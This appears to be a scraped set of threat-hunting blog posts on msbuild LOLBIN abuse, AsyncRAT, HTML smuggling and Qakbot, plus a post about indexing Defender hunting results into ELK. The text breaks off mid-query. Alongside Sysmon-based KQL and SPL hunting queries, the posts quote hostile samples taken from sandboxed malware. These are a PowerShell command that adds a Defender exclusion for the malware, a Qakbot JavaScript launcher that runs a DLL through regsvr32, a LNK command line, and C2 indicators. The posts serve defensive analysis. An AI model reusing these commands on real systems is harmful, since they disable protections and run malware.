    "body": "2023/01/21 - Why?There has been a new Advanced Persistent Threat group, named Dark Pink which have been using the msbuild. exe LOLBIN for doing their malicious deed. The group has been especially active in the APAC area, with some activity in Europe too - specifically in Bosnia and Herzegovina - weirdly enough. The group is mostly targeting military organizations so it is not a common threat for all the organizations. They have been reportedly using the msbuild. exe to launch the malicious code and this raised my interest. throughout my hunts and incident response investigations , I have not seen msbuild. exe being used that much. It is being used legitimately though, but not that commonly. Msbuild. exe is the binary for the Microsoft Build Engine platform. This platform is used to build applications. It is being used by, for example, Visual Studio but my understanding is that it is included in . NET Framework starting from the version 4. It does not require for any IDE being installed on the system. Thus, this is a great lolbin for a threat actor as the . NET framework is commonly installed to most Windowses.  Running  testsI thought that using Atomic Red Team would be a great start for this test. Atomic Red team is a collection of tests which can be ran in a bunch or individually to test, for example, if your monitoring solution is capable of detecting the techniques. It is mapped to Mitre ATT&amp;CK - the tests (called Atomics) are used to test individual techniques from the Mitre ATT&amp;CK Matrix. It does include tests which use MSbuild. exe so it makes testing easy. The first test is running C# and the second one Visual Basic. As they are otherwise completely the same there is no need to run both of them. I launched the first one and then started to look what that is like within Log analytics. There are a few actions taken but from these, there is nothing to exactly hunt for, except the actual commandline of the msbuild. exe process which shows from which folder the file has been launched. These tests are then not ideal for hunting for activity which happens after. I tried to look for a little more information how the actual malicious usage works within the attack conducted by the Dark Pink group. Unfortunately at the time of the writing the information was very hazy. Looking elsewhere, I found a great article by Cisco Talos about how the msbuild. exe has been used in different scenarios. There is great amount of information of how abusing the msbuild. exe can show with many tips on hunting the said activity too. The intake from the article is that there are many ways how it has been used.   These seem to be based more or less on spawning a child process and then launching further badness with those child processes, or further injecting to the spawned child processes. These offer some scenarios for threat hunting. It seems that looking at the child processes is a good idea, especially after ruling out false-positives. As the article lists few different potential child processes I added them all to the query. This is not very complex query, I know. sysmon| where ParentImage endswith  msbuild. exe | where Image has_any ( iexpolore. exe , powershell. exe , cmd. exe , pwsh. exe , wscript. exe )| project TimeGenerated, Computer, Image, CommandLine, ParentImage, ParentCommandLineOne option would be to only show results which  are rare. In the query below it will only show results if the child process has been seen less than 5 times. This could be also done by percentage, however that might not work that well within most environments as using msbuild. exe is relatively rare. Also I’d play with the actual child processes and potentially even remove the whole filter - only filtering out csc. exe which (I think) is spawned every time that the msbuild. exe is being launched. let processes = materialize (sysmon| where ParentImage endswith  msbuild. exe | where Image has_any ( iexpolore. exe , powershell. exe , cmd. exe , pwsh. exe , wscript. exe )| project TimeGenerated, Computer, Image, CommandLine, ParentImage, ParentCommandLine);processes| summarize count() by Image| where count_ &lt; 5| join kind=inner processes on ImageNot really that interesting or special still though, but could prove to be fruitful. Event id 8 (create remote thread) and event id 10 (process access) would likely be great at detecting malicious usage of the msbuild. exe tool. sysmon| where EventID == 10 or EventID == 8| where SourceImage endswith  msbuild. exe | project TimeGenerated, Computer, TargetImage, SourceImage, EventID, CallTraceAnd similarly to the child processes, these instances could be counted and then only the ones which don’t occur often shown as the results. let processes = materialize (sysmon| where EventID == 10 or EventID == 8| where SourceImage endswith  msbuild. exe | project TimeGenerated, Computer, TargetImage, SourceImage, EventID, CallTrace);processes| summarize count() by TargetImage| where count_ &lt; 5| join kind=inner processes on TargetImageThese queries are not anything fancy. Or to be more fair, these are quite boring low hanging fruit type of things. I was looking around for samples for malicious msbuild project files that could be used to verify what the actual badness looks like to no avail. I did find some samples from VirusTotal but unfortunately, I do not have an account which could be used to download the samples there for personal usage. Maybe one more thing - the parent processes of the msbuild. exe. One option would be to look for the execution by processes that are often associated to attacks, like powershell, wscript or cmd, however there shouldn’t be to many different parent processes. So, I’d take the statistical approach from the queries above - look for rarer parent processes. As there isn’t likely too many parent processes the easiest? approach would probably just to sort by the count of the parent process. Still, I left the materialize and join in as I’d like to see all the details from the get-go and not have to run multiple queries. let processes = materialize (sysmon| where Image endswith  msbuild. exe | project TimeGenerated, Computer, Image, CommandLine, ParentImage, ParentCommandLine);processes| summarize count() by ParentImage| join kind=inner processes on ParentImage| sort by count_ ascAnd this seems to work fine. It does get all the details for all the results as there are no limitation by count so this might just be unusable if mbsuild. exe is being used a lot within your environment. ConclusionI was hoping to get a little more to write about the msbuild. exe lolbin but unfortunately there actually aren’t too many samples available which would be using it for malicious purposes. This made the investigation towards the subject quite a lot harder than I originally thought and the post didn’t go as deep as I would have liked. I am not particularly happy with the queries within this post. I think these are very simplistic and all of them follow the same pattern so there is a lot to improve. For me, it is much easier to create the queries if I can verify it against actual data (and I throw out a wild guess that this is the same for all the others too) so not being able to verify much made this quite a lot harder. Thus, I only hunted for the scenarios which I could verify to produce hits. I did not create theoretical queries as I believe that there is too high chance of having a mistake in the query and thus it would provide zero value. Anyway, thanks for reading this far and see you next time. Github "
    }, {
    "id": 33,
    "url": "https://threathunt.blog/asyncrat/",
    "title": "AsyncRAT",
    "body": "2023/01/08 -  I haven’t observed any interesting new techniques recently, which is why I decided to analyze something that has been around for some time now. I’ve been interested in AsyncRAT for a while and decided to analyze it closer with threat hunting in mind. AsyncRAT is a Remote Access Tool which has been according to the Github page designed to remotely monitor and control other computers through a secure encrypted connection. It is quite often used by the threat actors as it has many built-in features that are very useful for them. The tool allows the remote management but also includes things like SFTP, anti analysis features, keylogger, dynamic DNS server support and many other helpful features. Not sure how often some of the offered features would offer a legitimate use though. Running the too. . malw. . whateverThe compiled binary is available in the GitHub repo, but I rather acquired a real malicious sample of the tool where it will connect to a command server. Thus, I browsed to tria. ge to see if there are any recent samples reported there. As per usual, there was plenty to choose from. My only requirement was pretty much that it would be fairly recent as a recent sample would most likely work. I decided to download a sample which also contained a loader called SmokeLoader, according to the tria. ge analysis. This is a fairly old loader which has been around since 2011, according to Mitre. The sample itself is a simple binary file. This resulted in a cmd-like window when it was ran - which was left running.  The data shows that the process proceeds to make an exclusion for the Defender Antivirus by running the following command: ““C:\Windows\System32\WindowsPowerShell\v1. 0\powershell. exe” Add-MpPreference -ExclusionPath “C:\tmp\230106-aztefsdg69_pw_infected\SOA. exe” -Force”. It also launches . NET framework related binaries, a few of them. As the AsyncRAT is C# code it was pretty much expected.  This results in a process called “AddInProcess32. exe” in connecting to Telegram API address, api. telegram. org. Looking at the computer itself the process is still running after 20 minutes of the initiated connection to Telegram. It is likely waiting for the threat actor to get active and continue to do manual activity on the device. It seems that the malware didn’t too much (any) discovery, which is quite abnormal as most of the loaders run discovery commands and send the information to the C2 server straight away when launched. Out of the blue, 20 minutes after idling the “AddInProcess32. exe” accessed lsass. exe. This is often done by  malicious processes to access the lsass memory to dump the credentials, but not sure if this is related to anything really this time. I downloaded the AsyncRAT from GitHub, launched it and compiled a client for it. The first version which I compiled crashed straight away but the second sample that I created worked. This turned out to be quite boring as the client only loaded the . NET framework related DLL images after which it connected to the “Command Server”. There are similarities to the malicious sample but only in loading the DLL:s, which is pretty much to be expected from the binary. A second sampleJust to verify the findings, I ran a secondary sample of AsyncRAT, to verify if there is some sort of pattern. Refreshingly, the second sample had at least a recognizable icon attached to it, the Intel logo! Otherwise I noted nothing special of the binary, thus I launched it. This time it left no window behind so it is at least partly different. It loaded the same . NET related image files (mscoree. dll, cld. dll, mscorlib. ni. dll and clrjit. dll) which were loaded by the client retrieved from GitHub. It seems that this is more or less the basic AsyncRAT client. The DNS query is sent to domain bevdona[. ]theworkpc. com. Any further activity would most likely need for the threat actor to launch manual activity using the AsyncRAT server. I am not going to wait for the threat actor to get active this time although it could tell a little more of how the actual AsyncRAT works. Not sure what I was expecting especially as the second sample was reported of being indeed a sample of AsyncRAT - the first one was likely a bit more customized as it came bundled with the SmokeLoader.   There isn’t a huge amount of possibilities for conducting a threat hunt against the actual AsyncRAT. The hunting part is explored next. Threat huntingFor starters, I added the Sysmon and some other log data to Sentinel. I like KQL a lot which is why I added Sysmon data also to KQL - it does still flow to Splunk too. KQL makes my life easier as I am much better with it than with SPL - although one of the reasons why I write this blog is to learn more so I don’t want to dump Splunk completely. I am not sure how I will be using the solutions, we shall see. As for Sentinel/Log Analytics, I used the parser for all Sysmon versions, available here. I saved the parser as a function with the name of Sysmon. To the hunting: First, I tried to recognize the DLL:s that were often loaded by other processes. This being . NET, they are being loaded constantly by legitimate binaries but there were two DLL images which were loaded less than the others. These were “C:\Windows\Microsoft. NET\Framework\v4. 0. 30319\clrjit. dll” and “C:\Windows\assembly\NativeImages_v4. 0. 30319_64\mscorlib\8d60a20bcb7b36d0ddf74b96d554c96e\mscorlib. ni. dll”, which both were loaded always by the AsyncRAT samples, but they were loaded by legitimate apps to0. I proceeded to join these two together: Sysmon| where EventID == 7| where ImageLoaded endswith  mscorlib. ni. dll | join kind=inner (Sysmon| where EventID == 7| where ImageLoaded endswith  clrjit. dll ) on Image, Computer, ProcessId| project Computer,TimeGenerated,Image, ImageLoaded, ImageLoaded1I got quite a few results with this query as was to be expected. It does hit the malicious samples too, which is fairly important for threat hunting purposes. I proceeded to join the existing data to any DNS event or network connection generated by the same process. This did pickup the basic AsyncRAT samples, but was missing the first one which was acting differently. Sysmon| where EventID == 7| where ImageLoaded endswith  mscorlib. ni. dll | join kind=inner (Sysmon| where EventID == 7| where ImageLoaded endswith  clrjit. dll ) on Image, Computer, ProcessId| project Computer,TimeGenerated,Image, ImageLoaded, ImageLoaded1, ProcessId| join kind=inner (Sysmon| where EventID == 22 or EventID == 3) on Computer, Image, ProcessId| project Computer, TimeGenerated, Image, RenderedDescription, DestinationIp, DestinationPort, QueryName, QueryResultsUnfortunately, with the first sample the process loading the DLL files is not actually launching the DNS query. The process which does launch the query is not loading any relevant DLL files to catch it, only AMSI and things like that. The same approach would not work in hunting the behavior by the first sample. I looked at the process creation event and noticed it was not logged, but the EvenId 10 (Process Access) was - this could be likely used. I created a query which joined the original two DLL loads, then joined that data to the Process Access event nd then finally joined it to the DNS query / network connection event similarly to the query above. This worked but also returned one false positive, so your mileage may vary. Developing in sandboxes is not providing realistic results but helps to develop stuff. This starts to be quite heavy too. On my very light environment the query execution took ~minute. Might not be doable in a real environment. Sysmon| where EventID == 7| where ImageLoaded endswith  mscorlib. ni. dll | join kind=inner (Sysmon| where EventID == 7| where ImageLoaded endswith  clrjit. dll ) on Image, Computer, ProcessId| project Computer,TimeGenerated, SourceImage = Image, SourceProcessId = ProcessId| join kind=inner (Sysmon| where EventID == 10) on SourceImage, SourceProcessId, Computer| project TimeGenerated, Computer, SourceImage, Image = TargetImage, ProcessId = TargetProcessId| join kind=inner (Sysmon| where EventID == 22 or EventID == 3) on Computer, Image, ProcessId| project Computer, TimeGenerated, SourceImage, Image, RenderedDescription, DestinationIp, DestinationPort, QueryName, QueryResultsHere are the same queries for Splunk. I had issues with SPL when joining to the network event. This was because the subsearch limited to the default 50k limit, which I didn’t want to change - so take the queries with little grain of salt as I haven’t been able to fully test them out. index=sysmon EventCode=7 ImageLoaded= *mscorlib. ni. dll  | join type=inner Image, Computer, ProcessId [search index=sysmon EventCode=7 ImageLoaded= *clrjit. dll ]index=sysmon EventCode=7 ImageLoaded= *mscorlib. ni. dll  | table _time, host, Image, ProcessId| join type=inner ProcessId, host, Image [search index=sysmon EventCode=7 ImageLoaded= *clrjit. dll ]| table _time, host, Image, ProcessId| join type=inner Image host ProcessId [search index=sysmon EventCode=22 OR EventCode=3]| table _time, host Image, TaskCategory, QueryName, QueryResult, DestinationIp, DestinationPortindex=sysmon EventCode=7 ImageLoaded= *mscorlib. ni. dll  | table _time, host, Image, ProcessId| join type=inner ProcessId, host, Image [search index=sysmon EventCode=7 ImageLoaded= *clrjit. dll ]| rename Image as SourceImage| rename ProcessId as SourceProcessId| table _time, host, SourceImage, SourceProcessId| join type=inner host, SourceImage, SourceProcessId [search index=sysmon EventCode=10]| rename TargetProcessId as ProcessId| rename TargetImage as Image| table _time, host, SourceImage, Image, ProcessId| join type=inner host, Image, ProcessId [search index=sysmon (EventCode=22 OR EventCode=3)]|table _time, host, SourceImage, Image, TaskCategory, QueryName, QueryResult, DestinationIp, DestinationPortConclusionIt was interesting to see couple of samples of the AsyncRAT to see how it looks like when executed. The tool/malware has quite some options that can be used (obfuscation, different kind of C2 comms etc. ) so the queries developed are still quite targeted and would likely only catch small portion. They do also provide benign true positive but they are not intended for being really detection rules. It was a lot of fun to analyze the sample(s) which proved to be a tad boring - although I sort of expected that. Hopefully I will figure out something else to write about next time than the malicious samples and hunting for them. This is all in good fun but I prefer variety. We shall see. Thanks for reading! Queries in Github. "
    }, {
    "id": 34,
    "url": "https://threathunt.blog/html-smuggling-how-does-it-look-like/",
    "title": "HTML Smuggling - how does it look like?",
    "body": "2022/12/18 -  HTML smuggling is a new technique to deliver malicious payload to the endpoints. The idea of the technique is to deliver the malicious code encoded in an image file that is embedded to a HTML attachment file. The reason for doing it this way is to pass the potential perimeter defenses as the malware is built on the local device. It is being reported on multiple different sites that the HTML smuggling technique is used to drop a ZIP file which contains a malicious JavaScript file. At least some of the most common loaders are reported of using the HTML smuggling technique already, Qbot and Trickbot at least. I decided to launch the sample found from here.  The contents of the file provided by Malware Traffic Analysis page is shown on the picture to right. It contains the malicious HTML file, PCAP and the Qakbot loader which is stored in the malicious HTML file. The original HTML file is to my interest, from which the infection starts. I launched the HTML file and it looks as to be expected, similar to the malware-traffic-analysis. net where I acquired the sample. The HTML page states that it is not able to show you the file correctly and you would need to use a locally downloaded file. This can be seen in the picture below.  It automatically downloads a zip file. The zip file contains a SCAN_DT6281. img file, which when clicked asks for the password. This reveals a LNK file which the target of the attack is expected to open. The shortcut points to the following location: C:\Windows\System32\cmd. exe /c IncomingPay\Issues. cmd A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9. Basically, it is starting a cmd -script from a subfolder stored in the img file.  The CMD script contents can bee seen on the left. It is somewhat obfuscated, I don’t really want to play around with it as I enjoy more running the actual malware an looking how the execution looks like from the endpoint protection perspective. I started the lnk shortcut and it executed the cmd script. Not very subtle as the actual interactive cmd screen could be seen  for a while, which in some cases might indicate to a user that something funny is going on. Sometimes the users notice these kinds of things - like a mystery black window appearing after clicking something. However, I am sure that more often the user does not report these anomalies, as they often can pop-up in legitimate  means too. Like when running logon scripts. Next, comes the analysis part. I am interested to see how this looks like from Sysmon. Looking at Splunk, the activity after clicking the shortcut is very normal for a loader like Qbot. Regsvr32. exe is launched and a malicious dll file is loaded by the process. Then it injects to wermgr. exe and continues to make a C2 connection to several different addresses. It runs some discovery commands while at it, like the loaders normally do. That’s it about the actual loader which was loaded from the malicious HTML file. Next, back to the HTML smuggling technique and especially how it could be hunted for. Threat huntingHTML smuggling: Some seconds after the HTML page is launched in Chrome it creates the ZIP file. There isn’t anything fancy here, although at the same time some JS files are being created to the temp folder. Someone more skilled with how the browser works would probably know if those are related. I tried to take a look at them they were already gone from the system so I couldn’t take a look what they were doing. The file creation as recorded by Sysmon is shown on left. There is nothing fancy to the event. It is just a zip file created by the Chrome process. There isn’t much to catch on with threat hunting with this, ZIP files are constantly being downloaded by the users. I decided to restore the snapshots at this stage as the malware still had active C2 communications. I wasn’t that interested in seeing to where the infection leads so the data that was gathered already from the HTML smuggling was enough for me. The next step was to start creating the threat hunting queries. It was a little limited in this case as there wasn’t that much to it with the HTML smuggling technique. My initial idea was to look at the HTML file being opened with the browser and then join the data to the ZIP file creation. I know, it is a little lame but at least I couldn’t pinpoint much anything else from it. Maybe it could also be joined to the ISO/IMG based queries where the actual malicious code is launched from those files, however it goes beyond the actual HTML smuggling technique. I’d myself rather have those separated as they are much more broad than only relating to the actual HTML smuggling. Same goes for the regsvr32. exe based DLL loads, I’d rather hunt for those anomalies as on their own. So, I started with looking for the process launch where the malicious HTML file is launched. I created the following query for this: index=sysmon (image:*chrome. exe OR image:*firefox. exe OR image:*opera. exe OR image:*MicrosoftEdge. exe) AND EventCode=1 AND (CommandLine:*. html OR CommandLine:*. htm) AND CommandLine: *--single-argument*  | table _time,host,CommandLine, Image,ParentCommandLine, ProcessIdThe browsers and the commandlines might change on different browsers, I used Chrome to test the technique. I did add some of the other browsers to the query but I wouldn’t count that the cmdline based filter works for them. The next part was to create a query which returns the created zip file. This I did as follows: index=sysmon (image:*chrome. exe OR image:*firefox. exe OR image:*opera. exe OR image:*MicrosoftEdge. exe) EventCode=15 TargetFilename:*. zip | table _time,host,CommandLine,Image,ProcessId,TargetFilenameThe interesting finding here is that the ProcessId changes. This probably relates to the way that Chrome handles the child processes but I don’t really want to dwell into that as I am not very knowledgeable in that. Nevertheless, the ProcessId can’t be used as basis for the join which makes this fairly tough. It can be done without the process id and it works fine in my test environment: index=sysmon (image:*chrome. exe OR image:*firefox. exe OR image:*opera. exe OR image:*MicrosoftEdge. exe) AND EventCode=1 AND (CommandLine:*. html OR CommandLine:*. htm) AND CommandLine: *--single-argument* | table _time,host,CommandLine, Image,ParentCommandLine, ProcessId| join type=inner host,Image [search index=sysmon (image:*chrome. exe OR image:*firefox. exe OR image:*opera. exe OR image:*MicrosoftEdge. exe) EventCode=15 TargetFileName:*. zip | table _time,host,Image,ProcessId, TargetFilename]This is not likely going to work very well in a real environment as there is nothing to tie these two events close to each other. It is just two fairly common events joined to each other using only the process path and this is probably going to result in many benign findings. The only way that I can think of in improving this would be to make the join based on the proximity of the timestamps. I haven’t played around the time based joining in SPL at all, so this might not be very sophisticated. index=sysmon (image:*chrome. exe OR image:*firefox. exe OR image:*opera. exe OR image:*MicrosoftEdge. exe) AND EventCode=1 AND (CommandLine:*. html OR CommandLine:*. htm) AND CommandLine: *--single-argument*  | table _time,host,CommandLine, Image,ParentCommandLine, ProcessId | eval start_time = _time | eval end_time = _time+60| map search= search index=sysmon (image:*chrome. exe OR image:*firefox. exe OR image:*opera. exe OR image:*MicrosoftEdge. exe) EventCode=15 TargetFileName:*. zip earliest=$start_time$ latest=$end_time$  | table _time,host,Image,ProcessId, TargetFilenameThis seems to work, it returns the latter events if they happen 60 seconds after the first event. This potentially might still cause too much noise in a production environment - not sure. Also, this leaves out the data from the first search. Not ideal. I ended up with one more query, which is basically the same as the earlier join but with the usetime=true, earlier=false filter in the join command. This only verifies that the latter event happens after the first, but does not set any boundaries more than that. It is likely possible to do this based on time based join but my SPL skills are a little lacking. index=sysmon (image:*chrome. exe OR image:*firefox. exe OR image:*opera. exe OR image:*MicrosoftEdge. exe) AND EventCode=1 AND (CommandLine:*. html OR CommandLine:*. htm) AND CommandLine: *--single-argument* | table _time,host,CommandLine, Image,ParentCommandLine, ProcessId| join type=inner usetime=true earlier=false host image [search index=sysmon (image:*chrome. exe OR image:*firefox. exe OR image:*opera. exe OR image:*MicrosoftEdge. exe) EventCode=15 TargetFileName:*. zip | rename _time as FileCreationTime | table FileCreationTime,host,Image,ProcessId, TargetFilename,time]ConclusionIt seems that there isn’t too many events to hunt for with the HTML smuggling technique. As interesting as the technique is it doesn’t in my opinion open up many hunting opportunities. I would still rather hunt for the events that happen after the HTML smuggling technique. There are so many ways how to the malware can be delivered to the endpoints that targeting a single technique is probably not super effective. However, targeting things like the regsvr32. exe and rundll32. exe loading malicious image files is much more broad. It doesn’t really account for the initial access, however it is quite effective in finding the modern loaders. In my experience these are currently very commonly used although that is of course subject to change anytime in the future. Also, one of my favorite things is targeting the persistence’s. I love hunting those! "
    }, {
    "id": 35,
    "url": "https://threathunt.blog/mde-mdi-mdo365-advanced-hunt-queries-to-elk/",
    "title": "MDE/MDI/MDO365 advanced hunt queries to ELK",
    "body": "2022/11/28 - I’ve been using Jupyter Notebook for quite sometime in threat hunting and incident response purposes. It is great as it offers the python data analytic tools to be used with the data that has been ingested to it. It supports whatever that you can imagine of using over the API and thus offers great flexibility as long as you have at least some python capabilities. There are awesome tools that support the Jupyter Notebook approach like the MSTICPY from Microsoft. The MSTICPY can be used to query/hunt against several different log sources and utilizes the Jupyter Notebook capabilities quite nicely. However, I am quite keen user of ELK too. I like ELK a lot and have used it during my DFIR teams for multiple different things. I love the visualizations that ELK can do and as such I was thinking what if I would actually combine these two? Would it bring any value over Jupyter Notebooks? The answer especially to the latter question is probably not going to get answered during this post though. I am just about to write about a technical solution how to integrated the MDE over the API so that you can create queries that can be stored in ELK. The ELK part of this post is minimal as I am no expert of building a production ready ELK and will never be. What do you need to get this working?  Working ELK instance MS Defender Advanced Hunting API access  Some threat hunting queries I guess?Setting up the ELK Simple ELK setup is crazy simple to do. The whole thing can be run in a docker container and there are several variations which can be used to launch ELK. I decided to go with a ready-made solution available here. I disabled the trial and used basic version of elasticsearch by modifying the elasticsearch. yml. Otherwise, all the changes that I did related to my local configuration, like changing the . env file. I did not need persistent data for this testing, however I found a great guide configuring this from here. I am running this on top of my server (Unraid) and starting everything remotely from there, I love to be able to run the containers on top of the thing. I can then manage them from different devices, keeping it running even if I shutdown one device. That needed a bit of tinkering within the docker-compose. yml but not much. Running the queries and indexing them to ElasticsearchFirst things first, you need to be able to run the Advanced Hunt queries somehow. This part shouldn’t be very complicated as there are different ready-made solutions for this. The only thing is that if you want to run multiple queries one after another that needs to be solved somehow. There are multiple ways how you could do this but as the idea of this is not to build the most fancy solution for this I am just storing the queries in dict. So basically, I have this part ready from my earlier blog post about Shodan. You can also get tips of creating the API keys for Defender from the same post. I only had to do some minor tweaking to get it working for this purpose, which are explained next. The  following function saves the query results returned by the API in a dict. There should be a Timestamp field available (remember not to remove this field from the queries) which is in the iso8601 format that is naturally understood by ELK as a time format. This  makes it easy to index and use this field as the Timestamp field when the index pattern is created.   The other fields are left for the ELK stack to interpret. In a real environment this is likely not a great idea, especially if you would like to se the integer fields as base of statistical approach of things. # Exec mtp query copied from here: https://github. com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Notebooks/M365D%20APIs%20ep3. ipynb# Declare a function to query the M365 Defender API# Minor changes madedef exec_mtp_query(query,aadToken):  url =  https://api. security. microsoft. com/api/advancedhunting/run  #M365 Advanced Hunting API  headers = {   'Content-Type' : 'application/json',  'Accept' : 'application/json',  'Authorization' :  Bearer   + aadToken  }  data = json. dumps({ 'Query' : query }). encode( utf-8 )  req = urllib. request. Request(url, data, headers)  response = urllib. request. urlopen(req)  jsonResponse = json. loads(response. read())  results = jsonResponse[ Results ]  return resultsNext, the script had to be modified so that it will push the data to Elasticsearch. This could be done over a simple API call towards the Elasticsearch instance using urllib or whatever. However, I noticed that there is an official elasticsearch python client. The python client proved to be super easy to use. First, set the ES instance and then start sending data. Didn’t really bother to explore much of the authentication or other “advanced” features, as I am running unauthenticated version at home. It is possible that there are some missing functions which make it hard(er) to use in a production environment. Anyway, the script is super simple in the end. In the following code the queries are stored in a dict which are then looped through to launch the queries against the MDE API and then the results are stored in the Elasticsearch. I also added the query name to the dict so that it is easier to see which query gave which results. #Add the filters to a dict#Follow the same format to add your own queries. queries = {  'AADSpnSignInEventsBeta_testing': f'AADSpnSignInEventsBeta | where Timestamp &gt; ago(30d)',  'EmailUrlInfo_testing': f'EmailUrlInfo| where Timestamp &gt; ago(30d)'}#Authenticate to the MDE API. aadToken = app_auth(Client_id,Client_secret,TenantId)#Run the queries stored in the queries dict, one by one. for a in queries:  results = exec_mtp_query(queries[a],aadToken)  if results:    for r in results:      r['query_name'] = a      resp = es. index(index= mde_data , document=r)      print(resp['result'])  else:    print( Dict is empty, no results for the query   + a)The full script is available here. KibanaNext step is to launch Kibana and to create a new Data View. As the index name is mde_data it could for example look something like this: This should now parse the Timestamp field nicely and it also formatted all the numerical fields which were part of the data correctly. You don’t need to know all the field names here (thankfully as there are quite some in MDE, especially if you are like me and like to rename the fields in the queries to make them more logical) to be able to ingest the data. I am sure that pretty much all the things would be eaten up to the elasticsearch nicely. As I currently don’t have active MDE license the demo visuals are created from some email/authentication data which is why they are quite lame. With actual MDE data and some fancy threat hunting queries this could look much better. I myself just love setting up the visuals and always enjoy that. If you are like me and also using MDE for threat hunting this might be something that you might be able to use.  ConclusionWhy? Why would you do this instead of using Jupyter Notebook and the visualizations there? Well. So far as much as I like Jupyter Notebooks the interactive tables that I’ve used are much more cumbersome to use than the Discover feature of Kibana. I like the discover of Kibana quite a lot. Also the visualizations are (to me) easier to approach over Kibana than with Jupyter Notebooks. Also, when you are starting to get lot of data to Jupyter Notebooks the performance isn’t the best anymore. All in all, I think ELK can potentially be a better solution for ingesting the data from threat hunting queries. It is, however, more limited than using the good ol’ Jupyter Notebook and data analysis tools that Python can offer. ELK offers more persistent data as it is stored in the Elasticsearch database - if you need to revisit the data it might be a good idea to store it in ELK. I think though, there would be room for both options - maybe store the data in ELK and use Jupyter Notebook for hunting - or use whatever suits the task better. I also might continue this later if I get inspiration to build some better dashboards or whatever. Thanks for reading! Github link to the script: https://github. com/JouniMi/Threathunt. blog/blob/main/mde_to_elk. py "
    }, {
    "id": 36,
    "url": "https://threathunt.blog/qakbot/",
    "title": "Qakbot",
    "body": "2022/11/22 - Qakbot - anything new on a recent sample? I’ve been looking through tria. ge to see what has been the recent trend in the malware world. For the last couple of days the majority of the samples supplied (no actual statistics, just a hunch based on looking at the recently uploaded samples) has been Qakbot. Also there has been a few Asyncrat samples and a ton of random others. I decided to grab a sample of Qakbot to see if there is something new to be seen. The sample was this. It contains ContractCopy_YZ62. img file, which I mounted to Windows. The image file contains couple of files, but the ContractCopy. js is the only one that is not hidden for the user. The file has the following contents: var q = WScript. CreateObject( Scripting. FileSystemObject ). OpenTextFile( data. txt , 1). ReadAll();/**Signed*/WScript. CreateObject( shell. application ). shellexecute( reg  + q,  addled\\soloists. tmp ,   ,  open , 1);It basically launches the DLL file which is stored under the addled folder, with the name of soloists. tmp.  I verified that the file is indeed a DLL file with SHA1 hash of e706be44c0bf3cf12ee1b357b0d037f172a5220a. What happens next is that the soloist. tmp file is launched with regsvr32. exe.  Next, the regsvr32. exe accesses the legitimate process wermgr. exe. After this, the malware starts to connect to the C2 server, on IP 217[. ]. 128. 91. 196 using port 2222. The C2 server address and port is constantly changing. A while later, the process starts to launch the typical commands that any of the loaders tend to do. For example, net view, whoami /all, nestat -nao, route print and nslookup.  After this, the malware seems to get quiet. Maybe the results of the queries were deemed non interesting, it is quite easy to determine that this isn’t a real environment. The malware continues to connect to the C2 server every now and then. What is interesting is that I haven’t been able to observe any sort of persistence mechanism being created. Maybe it would only have been created if a further payload would have been launched? I decided to play the waiting game and wait at least some hours to see if something will happen. Wait. . it actually GOT active once more?I’ve been gone for couple of hours and took a look if there was something going on. It seems that the process was starting ping. exe and also creating a remote thread (injecting) to the ping. exe. This seems a little weird and I have no explanation of why this would be. However, I am fairly certain that wermgr. exe shouldn’t be doing this legitimately. The ping. exe process was started with -t 127. 0. 0. 1 commandline, so constantly pinging localhost. The process was terminated couple of seconds later. The wermgr. exe writes a file c:\Windows\SysWOW64\afzgd32. dll moments later. This was not present anymore in the disk so I couldn’t check the file hash for it, unfortunately. Also, it seems that this file was never loaded by any process. Nevertheless, it seems that the process initiated a connection to my WEF server and Domain Controller after that. After the connections were initiated, there seems to be a quite interesting service being created on both on the WEF server and the domain controller. A Malicious DLL is created to c$ share which then launched as a service. This creates the persistence which was missing from the original host to DC and WEF. There wasn’t a file creation event in Sysmon for the creation of the DLL file, which I don’t know the reason of. Maybe this is related to the configuration that is used in DetectionLab, as I have not modified the configuration. The file itself is found from the root of the C: -drive with another file that is later created as a service too. The file is the same though. The malicious DLL file continues to inject into the wrmgr. exe as it did on the original host. It is likely that the file is pretty much the same than the original malicious DLL file. SHA1 hash of the file is E59C813E4ECE039221DF119069501B5C811ACBFE - I uploaded it to VirusTotal. Virustotal didn’t really give out too much about this sample. Could be interesting to do more analysis on it. I continued to look at the activity by the malware but there wasn’t anything too interesting which would catch my eye. The malware continued to connect to the command servers. There were still the several ports and IP-addresses to which the malware connected to. During the day, the malware connected to 92 distinct IP-addresses and to 8 distinct ports. The ports where the following, with counts in brackets 443 (1280), 995 (141), 22 (87), 2222 (60), 80 (30), 32103 (12), 1900 (3) and 65400 (3). It is likely that all of them are not malicious. I would assume that some of them were used to fetch the CRL lists for example. The malware continues to run discovery commands. It runs mostly the same commands as before on the Windows 10 host, however there are some additions. For example, the malware tries to gain information of domain trusts by running the nltest /domain_trusts /all_trusts command. Nothing quite interesting though. I did create a pie chart of Commandlines of the processes which have been started by the now injected wermgr. exe process. Almost all the commands were ran the same amount of time so it is likely built-in to the malware. I decided to kill the connection to the environment at this point. It should be quite isolated but can’t be completely certain so I’d rather not leave the malware running too long. I took some dumps from the hosts for further analysis and suspended the hosts, waiting to be nuked from the orbit. Next, a little threat hunting so that I don’t completely drift out of the purpose of the blog! Threat huntingHunting for Command &amp; Control traffic can be hard. In this instance I can explain why; the malware is connecting to several different servers to several different ports and the actual interval between of the callbacks changes by a long margin. Sometimes the malware continues to call home on a single minute interval and sometimes it is much longer. I know that many people have tried to tackle this issue and there are great sources for this like RITA. I don’t really tend to go further in this subject - it requires a lot skills in data analytics which goes much beyond my current capabilities. So what about the endpoint based hunting? Well there are some things that can be done. First, let’s look at the process start of regsvr32. exe (to get the parent commandline) and join that data to injection event. I added the two full image paths for regsvr32. exe. Could be done more easily with the OriginalFileName field, for example. index=sysmon EventCode=1 AND (Image= C:\\Windows\\System32\\regsvr32. exe  OR Image= C:\\Windows\\SysWOW64\\regsvr32. exe ) | table _time, host, CommandLine, Image, ParentImage, ParentCommandLine, ProcessId | rename ProcessId as SourceProcessId, Image as SourceImage | join type=inner host SourceProcessId SourceImage [search index=sysmon AND (SourceImage= C:\\Windows\\System32\\regsvr32. exe  OR SourceImage= C:\\Windows\\SysWOW64\\regsvr32. exe ) EventCode=10 | table _time, host, SourceProcessId, SourceImage, TargetImage, TargetProcessId]The next query just adds a one more join - join if there is a network connection initiated by the process which has been injected to. index=sysmon EventCode=1 AND (Image= C:\\Windows\\System32\\regsvr32. exe  OR Image= C:\\Windows\\SysWOW64\\regsvr32. exe ) | table _time, host, 